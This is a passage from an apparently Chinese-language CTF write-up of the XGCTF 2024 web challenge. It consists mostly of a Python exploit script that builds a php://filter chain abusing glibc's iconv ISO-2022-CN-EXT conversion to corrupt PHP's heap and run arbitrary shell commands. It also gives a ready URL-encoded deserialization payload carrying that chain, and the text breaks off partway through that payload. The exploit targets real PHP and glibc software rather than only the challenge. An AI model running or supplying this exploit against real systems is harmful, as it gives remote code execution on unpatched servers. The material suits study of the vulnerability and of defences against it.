punctuation">(</span>step3_size <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>BUG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> BUG        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step4_size <span class="token operator">=</span> CS        step4 <span class="token operator">=</span> <span class="token string">b"=00"</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step4_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4_pwn <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            <span class="token number">0x200000</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token comment"># free_slot</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_CUSTOM_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x18</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x140</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            size<span class="token operator">=</span>CS<span class="token punctuation">,</span>        <span class="token punctuation">)</span>        step4_custom_heap <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            ADDR_EMALLOC<span class="token punctuation">,</span> ADDR_EFREE<span class="token punctuation">,</span> ADDR_EREALLOC<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x18</span>        <span class="token punctuation">)</span>        step4_use_custom_heap_size <span class="token operator">=</span> <span class="token number">0x140</span>        COMMAND <span class="token operator">=</span> self<span class="token punctuation">.</span>command        COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"kill -9 $PPID; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"sleep </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>sleep<span class="token punctuation">&#125;</span></span><span class="token string">; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span>        <span class="token keyword">assert</span> <span class="token punctuation">(</span>            <span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> step4_use_custom_heap_size        <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Command too big (</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">), it must be strictly inferior to </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> COMMAND        step4_use_custom_heap <span class="token operator">=</span> qpe<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        pages <span class="token operator">=</span> <span class="token punctuation">(</span>            step4 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step4_pwn            <span class="token operator">+</span> step4_custom_heap            <span class="token operator">+</span> step4_use_custom_heap            <span class="token operator">+</span> step3_overflow            <span class="token operator">+</span> pad <span class="token operator">*</span> self<span class="token punctuation">.</span>pad            <span class="token operator">+</span> step1 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step2_write_ptr            <span class="token operator">+</span> step2 <span class="token operator">*</span> <span class="token number">2</span>        <span class="token punctuation">)</span>        resource <span class="token operator">=</span> compress<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>pages<span class="token punctuation">)</span><span class="token punctuation">)</span>        resource <span class="token operator">=</span> b64<span class="token punctuation">(</span>resource<span class="token punctuation">)</span>        resource <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        filters <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>                        <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>                        <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>                        <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>                        <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.UTF-8.ISO-2022-CN-EXT"</span><span class="token punctuation">,</span>                        <span class="token string">"convert.quoted-printable-decode"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span>        filters <span class="token operator">=</span> <span class="token string">"|"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>filters<span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/read=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filters<span class="token punctuation">&#125;</span></span><span class="token string">/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">return</span> path    <span class="token decorator annotation punctuation">@inform</span><span class="token punctuation">(</span><span class="token string">"Triggering..."</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        path <span class="token operator">=</span> self<span class="token punctuation">.</span>build_exploit_path<span class="token punctuation">(</span><span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]"</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> start <span class="token operator">+</span> self<span class="token punctuation">.</span>sleep <span class="token operator">&lt;=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]"</span><span class="token punctuation">)</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compress</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns data suitable for `zlib.inflate`.    """</span>    <span class="token keyword">return</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">b64</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> misalign <span class="token keyword">and</span> payload<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Misaligned: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compressed_bucket</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns a chunk of size 0x8000 that, when dechunked, returns the data."""</span>    <span class="token keyword">return</span> chunked_chunk<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">qpe</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Emulates quoted-printable-encode.    """</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ptr_bucket</span><span class="token punctuation">(</span><span class="token operator">*</span>ptrs<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Creates a 0x8000 chunk that reveals pointers after every step has been ran."""</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">==</span> size    bucket <span class="token operator">=</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>p64<span class="token punctuation">,</span> ptrs<span class="token punctuation">)</span><span class="token punctuation">)</span>    bucket <span class="token operator">=</span> qpe<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    <span class="token keyword">return</span> bucket<span class="token keyword">def</span> <span class="token function">chunked_chunk</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Constructs a chunked representation of the given chunk. If size is given, the    chunked representation has size `size`.    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.    """</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span>    keep <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">b"\n\n"</span><span class="token punctuation">)</span>    size <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>size <span class="token operator">-</span> keep<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> size<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\n"</span> <span class="token operator">+</span> data <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Region</span><span class="token punctuation">:</span>    start<span class="token punctuation">:</span> <span class="token builtin">int</span>    stop<span class="token punctuation">:</span> <span class="token builtin">int</span>    permissions<span class="token punctuation">:</span> <span class="token builtin">str</span>    path<span class="token punctuation">:</span> <span class="token builtin">str</span>    <span class="token decorator annotation punctuation">@property</span>    <span class="token keyword">def</span> <span class="token function">size</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>stop <span class="token operator">-</span> self<span class="token punctuation">.</span>startExploit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707121510526.png" alt="image-20240707121510526"></p><p>执行失败是因为read的宽字节注入没配平</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707121556868.png" alt="image-20240707121556868"></p><p>自己测试到配成<code>O:</code>开头为止，然后打入最后的payload（需要url编码）：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>start<span class="token operator">=</span>aO<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>read<span class="token operator">%</span><span class="token number">5</span>Ffile<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>start<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>gxngxngxn<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>filename<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1036<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>php<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>Ffilter<span class="token operator">%</span><span class="token number">2</span>Fread<span class="token operator">%</span><span class="token number">3</span>Dzlib<span class="token operator">%</span><span class="token number">2</span>Einflate<span class="token operator">%</span><span class="token number">7</span>Czlib<span class="token operator">%</span><span class="token number">2</span>Einflate<span class="token operator">%</span><span class="token number">7</span>Cdechunk<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Eiconv<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">7</span>Cdechunk<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Eiconv<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">7</span>Cdechunk<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Eiconv<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">7</span>Cdechunk<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Eiconv<span class="token operator">%</span><span class="token number">2</span>EUTF<span class="token operator">%</span><span class="token number">2</span>D8<span class="token operator">%</span><span class="token number">2</span>EISO<span class="token operator">%</span><span class="token number">2</span>D2022<span class="token operator">%</span><span class="token number">2</span>DCN<span class="token operator">%</span><span class="token number">2</span>DEXT<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Equoted<span class="token operator">%</span><span class="token number">2</span>Dprintable<span class="token operator">%</span><span class="token number">2</span>Ddecode<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Eiconv<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">2</span>Fresource<span class="token operator">%</span><span class="token number">3</span>Ddata<span class="token operator">%</span><span class="token number">3</span>Atext<span class="token operator">%</span><span class="token number">2</span>Fplain<span class="token operator">%</span><span class="token number">3</span>Bbase64<span class="token operator">%</span><span class="token number">2</span>Ce3vXt<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>BNiQhbQP<span class="token operator">%</span><span class="token number">2</span>F7lrUWoS9fXVFgvvf6evI0B5ZzZjMMksp1mmoLZJsnJLRc8bD5KRN5v3f13Z8rs6<span class="token operator">%</span><span class="token number">2</span>BabGViwAsMWlMtH2ltX33FcPX2G9m6xd0pzfg1MPgkRfbtOPVWq<span class="token operator">%</span><span class="token number">2</span>FTMK91vUafvKN1UIKBjcsQ05XVFu71kN1d1771mtN3DjIOAFU<span class="token operator">%</span><span class="token number">2</span>F35RROrZpqlbb1m<span class="token operator">%</span><span class="token number">2</span>FmB74Wr62Vqfvwou<span class="token operator">%</span><span class="token number">2</span>F16k<span class="token operator">%</span><span class="token number">2</span>F2nH7X10d<span class="token operator">%</span><span class="token number">2</span>Buf<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>Fymlyz1ev<span class="token operator">%</span><span class="token number">2</span>B8<span class="token operator">%</span><span class="token number">2</span>FZez3q5Ag44Mf<span class="token operator">%</span><span class="token number">2</span>B6isvnqZKp565pvvt<span class="token operator">%</span><span class="token number">2</span>B6780vrq29NTwebsvWYX9<span class="token operator">%</span><span class="token number">2</span>Brfj037bf<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>Fq9S7N<span class="token operator">%</span><span class="token number">2</span>B9<span class="token operator">%</span><span class="token number">2</span>FjPzJ7Tz4jft<span class="token operator">%</span><span class="token number">2</span>F6u<span class="token operator">%</span><span class="token number">2</span>Fx16xPvsuvF59wv15is3zWm<span class="token operator">%</span><span class="token number">2</span>FXf<span class="token operator">%</span><span class="token number">2</span>F36srN<span class="token operator">%</span><span class="token number">2</span>Fz5WPU9<span class="token operator">%</span><span class="token number">2</span>Bi770<span class="token operator">%</span><span class="token number">2</span>FX<span class="token operator">%</span><span class="token number">2</span>Fb<span class="token operator">%</span><span class="token number">2</span>FCLzf<span class="token operator">%</span><span class="token number">2</span>F2<span class="token operator">%</span><span class="token number">2</span>FHPv14<span class="token operator">%</span><span class="token number">2</span>Ft9u79<span class="token operator">%</span><span class="token number">2</span>B3356Ubvm2f8jxi<span class="token operator">%</span><span class="token number">2</span>Fu9d<span class="token operator">%</span><span class="token number">2</span>F3ZanJ<span class="token operator">%</span><span class="token number">2</span>Bw<span class="token operator">%</span><span class="token number">2</span>FNa347<span class="token operator">%</span><span class="token number">2</span>B3PivdX3<span class="token operator">%</span><span class="token number">2</span>Fv<span class="token operator">%</span><span class="token number">2</span>Ffvff9fON7N<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>FPNe7N6m3Wmt<span class="token operator">%</span><span class="token number">2</span>Buqv<span class="token operator">%</span><span class="token number">2</span>F1<span class="token operator">%</span><span class="token number">2</span>Fm73vy9e<span class="token operator">%</span><span class="token number">2</span>Fl<span class="token operator">%</span><span class="token number">2</span>BKr9vV93vOn8qV<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>FdyFUm0fr3c8ec6L33UJUqc3HQ19FfpqxlWp1LT9fz8Vq9xmxq<span class="token operator">%</span><span class="token number">2</span>Bl4aGNUvLZjLXHxVKFJn6RH1U8qnhUMZ0VJ1R5rzW8<span class="token operator">%</span><span class="token number">2</span>FFjvceb8xTqBSjfZCJRpl6OzemfKlUv6<span class="token operator">%</span><span class="token number">2</span>F5ZJ7RQ6aUZA<span class="token operator">%</span><span class="token number">2</span>BYx7Qdlnvuw4XXHruYb3FI9tjPiVH9gybdfR0Kwa3<span class="token operator">%</span><span class="token number">2</span>B1<span class="token operator">%</span><span class="token 